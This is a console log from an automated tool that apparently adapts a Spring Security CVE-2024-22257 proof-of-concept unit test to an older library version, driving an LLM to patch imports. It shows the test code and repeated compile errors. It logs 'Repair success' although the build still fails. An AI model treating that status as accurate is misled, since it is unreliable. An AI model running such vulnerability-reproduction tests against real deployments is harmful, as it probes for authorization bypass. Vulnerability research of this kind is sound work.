[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 2719 (prompt), 1 (completion), 2720 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 2.0.8.RELEASE:org.springframework.security:spring-security-core.
This test file compiles and runs successfully with version 3.0.0.RELEASE.

Your task is to:
1. Analyze why this issue occurs with the *3.0.0.RELEASE* but not with the *2.0.8.RELEASE version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2024-22257 >--------------------
[INFO] Building CVE-2024-22257 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2024-22257 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2024-22257 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2024-22257 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2024-22257 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2024-22257 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,48] package org.springframework.security.access.vote does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[11,51] package org.springframework.security.authentication does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol
  symbol:   class Authentication
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,9] cannot find symbol
  symbol:   class AuthenticatedVoter
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,40] cannot find symbol
  symbol:   class AuthenticatedVoter
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,63] cannot find symbol
  symbol:   variable AuthenticatedVoter
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,20] cannot find symbol
  symbol:   class AnonymousAuthenticationToken
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol
  symbol:   variable AuthorityUtils
  location: class edu.vision.se.Testcase1
[INFO] 10 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.318 s
[INFO] Finished at: 2025-07-10T06:46:16Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,48] package org.springframework.security.access.vote does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[11,51] package org.springframework.security.authentication does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol
[ERROR]   symbol:   class Authentication
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,9] cannot find symbol
[ERROR]   symbol:   class AuthenticatedVoter
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,40] cannot find symbol
[ERROR]   symbol:   class AuthenticatedVoter
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,63] cannot find symbol
[ERROR]   symbol:   variable AuthenticatedVoter
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,20] cannot find symbol
[ERROR]   symbol:   class AnonymousAuthenticationToken
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol
[ERROR]   symbol:   variable AuthorityUtils
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2024-22257</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-core</artifactId>
            <version>2.0.8.RELEASE</version>
        </dependency>

        
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.24.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 144 (prompt), 11 (completion), 155 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 2.0.8.RELEASE: 

Error: package org.springframework.security.access.vote does not exist, None, None 

The test executes as expected in 3.0.0.RELEASE 

Error code: import org.springframework.security.access.vote.AuthenticatedVoter; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.springframework.security.access.vote;AuthenticatedVoter
[96m[ErrorManager] Extracted key entities: ['org.springframework.security.access.vote', 'AuthenticatedVoter'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 10, 'column': 48, 'message': 'package org.springframework.security.access.vote does not exist', 'symbol': None, 'location': None, 'code_line': 'import org.springframework.security.access.vote.AuthenticatedVoter;'} with cause: ['org.springframework.security.access.vote', 'AuthenticatedVoter'][0m
[96m[Adapter] Related diffs for error: [(567, 14.0), (555, 4.0), (561, 4.0), (571, 4.0), (572, 4.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: package org.springframework.security.access.vote does not exist | cause: ['org.springframework.security.access.vote', 'AuthenticatedVoter'][0m
[96m[RepairModule] Trying best diff #567 with score 14.00[0m
[LLMClient] Tokens used: 1125 (prompt), 257 (completion), 1382 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 2.0.8.RELEASE:org.springframework.security:spring-security-core.
This test file compiles and runs successfully in 3.0.0.RELEASE.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.0.0.RELEASE to 2.0.8.RELEASE.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: package org.springframework.security.access.vote does not exist, symble: None, location: None

### Error Position:
import org.springframework.security.access.vote.AuthenticatedVoter;

### Related Diff:
Operation: MODIFIED, File: core/src/main/java/org/springframework/security/access/vote/AuthenticatedVoter.java, Hunk: @@ -13,30 +13,31 @@
  * limitations under the License.
  */

+package org.springframework.security.vote;
-package org.springframework.security.access.vote;

+import org.springframework.security.Authentication;
+import org.springframework.security.AuthenticationTrustResolver;
+import org.springframework.security.AuthenticationTrustResolverImpl;
+import org.springframework.security.ConfigAttribute;
+import org.springframework.security.ConfigAttributeDefinition;
-import java.util.Collection;

-import org.springframework.security.access.AccessDecisionVoter;
-import org.springframework.security.access.ConfigAttribute;
-import org.springframework.security.authentication.AuthenticationTrustResolver;
-import org.springframework.security.authentication.AuthenticationTrustResolverImpl;
-import org.springframework.security.core.Authentication;
 import org.springframework.util.Assert;

+import java.util.Iterator;
+

 /**
+ * <p>Votes if a {@link ConfigAttribute#getAttribute()} of <code>IS_AUTHENTICATED_FULLY</code> or
- * Votes if a {@link ConfigAttribute#getAttribute()} of <code>IS_AUTHENTICATED_FULLY</code> or
  * <code>IS_AUTHENTICATED_REMEMBERED</code> or <code>IS_AUTHENTICATED_ANONYMOUSLY</code> is present. This list is in
+ * order of most strict checking to least strict checking.</p>
+ *  <p>The current <code>Authentication</code> will be inspected to determine if the principal has a particular
+ * level of authentication. The "FULLY" authenticated option means the user is authenticated fully (ie {@link
+ * org.springframework.security.AuthenticationTrustResolver#isAnonymous(Authentication)} is false and {@link
+ * org.springframework.security.AuthenticationTrustResolver#isRememberMe(Authentication)} is false. The "REMEMBERED" will grant
- * order of most strict checking to least strict checking.
- * <p>
- * The current <code>Authentication</code> will be inspected to determine if the principal has a particular
- * level of authentication. The "FULLY" authenticated option means the user is authenticated fully (i.e. {@link
- * org.springframework.security.authentication.AuthenticationTrustResolver#isAnonymous(Authentication)} is false and {@link
- * org.springframework.security.authentication.AuthenticationTrustResolver#isRememberMe(Authentication)} is false). The "REMEMBERED" will grant
  * access if the principal was either authenticated via remember-me OR is fully authenticated. The "ANONYMOUSLY" will
+ * grant access if the principal was authenticated via remember-me, OR anonymously, OR via full authentication.</p>
+ *  <p>All comparisons and prefixes are case sensitive.</p>
- * grant access if the principal was authenticated via remember-me, OR anonymously, OR via full authentication.
- * <p>
- * All comparisons and prefixes are case sensitive.
  *
  * @author Ben Alex
  * @version $Id$

### Test File Content:
package edu.vision.se;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.Test;
import org.springframework.security.vote.AccessDecisionVoter;
import org.springframework.security.ConfigAttribute;
import org.springframework.security.SecurityConfig;
import org.springframework.security.access.vote.AuthenticatedVoter;
import org.springframework.security.authentication.AnonymousAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.authority.AuthorityUtils;

public class Testcase1 {

    @Test
    public void testAnonymousWorks() {
        AuthenticatedVoter voter = new AuthenticatedVoter();
        List<ConfigAttribute> def = SecurityConfig.createList(AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY);
        validateReturnValue(voter.vote(null, null, def));
    }

    public void validateReturnValue(int result) {
         assertThat(result).isEqualTo(AccessDecisionVoter.ACCESS_DENIED);
    }

    public Authentication createAnonymous() {
        return new AnonymousAuthenticationToken("ignored", "ignored", AuthorityUtils.createAuthorityList("ignored"));
    }
}


[LLMClient] Response: 
Here's the modified version of the test file according to the diff:

```java
package edu.vision.se;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.Test;
import org.springframework.security.vote.AccessDecisionVoter;
import org.springframework.security.ConfigAttribute;
import org.springframework.security.SecurityConfig;
import org.springframework.security.vote.AuthenticatedVoter;
import org.springframework.security.authentication.AnonymousAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.authority.AuthorityUtils;

public class Testcase1 {

    @Test
    public void testAnonymousWorks() {
        AuthenticatedVoter voter = new AuthenticatedVoter();
        List<ConfigAttribute> def = SecurityConfig.createList(AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY);
        validateReturnValue(voter.vote(null, null, def));
    }

    public void validateReturnValue(int result) {
         assertThat(result).isEqualTo(AccessDecisionVoter.ACCESS_DENIED);
    }

    public Authentication createAnonymous() {
        return new AnonymousAuthenticationToken("ignored", "ignored", AuthorityUtils.createAuthorityList("ignored"));
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.ComparisonFailure'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[11,51] package org.springframework.security.authentication does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Authentication[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,51] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method createList(java.lang.String)[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class org.springframework.security.SecurityConfig[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[21,52] incompatible types: java.util.List<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,20] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AnonymousAuthenticationToken[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable AuthorityUtils[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[93m[RepairModule] [Analyzer] New error:
  File     : /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java
  Line     : 21, Column: 52
  Message  : incompatible types: java.util.List<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition
  Symbol   : None
  Location : None
  Code     : validateReturnValue(voter.vote(null, null, def));
  Position : after the fixing line (10)[0m
[93m[RepairModule] [Analyzer] New error:
  File     : /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java
  Line     : 20, Column: 51
  Message  : cannot find symbol
  Symbol   : method createList(java.lang.String)
  Location : class org.springframework.security.SecurityConfig
  Code     : List<ConfigAttribute> def = SecurityConfig.createList(AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY);
  Position : after the fixing line (10)[0m
[92m[RepairModule] Error package org.springframework.security.access.vote does not exist resolved after applying diff.[0m
[92m[RepairModule] Repair success with best diff![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.ComparisonFailure'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[11,51] package org.springframework.security.authentication does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Authentication[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,51] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method createList(java.lang.String)[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class org.springframework.security.SecurityConfig[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[21,52] incompatible types: java.util.List<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,20] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AnonymousAuthenticationToken[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable AuthorityUtils[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 2485 (prompt), 1 (completion), 2486 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 2.0.8.RELEASE:org.springframework.security:spring-security-core.
This test file compiles and runs successfully with version 3.0.0.RELEASE.

Your task is to:
1. Analyze why this issue occurs with the *3.0.0.RELEASE* but not with the *2.0.8.RELEASE version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2024-22257 >--------------------
[INFO] Building CVE-2024-22257 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2024-22257 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2024-22257 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2024-22257 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2024-22257 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2024-22257 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[WARNING] COMPILATION WARNING : 
[INFO] -------------------------------------------------------------
[WARNING] Some messages have been simplified; recompile with -Xdiags:verbose to get full output
[INFO] 1 warning
[INFO] -------------------------------------------------------------
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[11,51] package org.springframework.security.authentication does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol
  symbol:   class Authentication
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,51] cannot find symbol
  symbol:   method createList(java.lang.String)
  location: class org.springframework.security.SecurityConfig
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[21,52] incompatible types: java.util.List<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,20] cannot find symbol
  symbol:   class AnonymousAuthenticationToken
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol
  symbol:   variable AuthorityUtils
  location: class edu.vision.se.Testcase1
[INFO] 8 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.408 s
[INFO] Finished at: 2025-07-10T06:46:44Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[11,51] package org.springframework.security.authentication does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol
[ERROR]   symbol:   class Authentication
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,51] cannot find symbol
[ERROR]   symbol:   method createList(java.lang.String)
[ERROR]   location: class org.springframework.security.SecurityConfig
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[21,52] incompatible types: java.util.List<org.springframework.security.ConfigAttribute> cannot be converted to org.springframework.security.ConfigAttributeDefinition
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,20] cannot find symbol
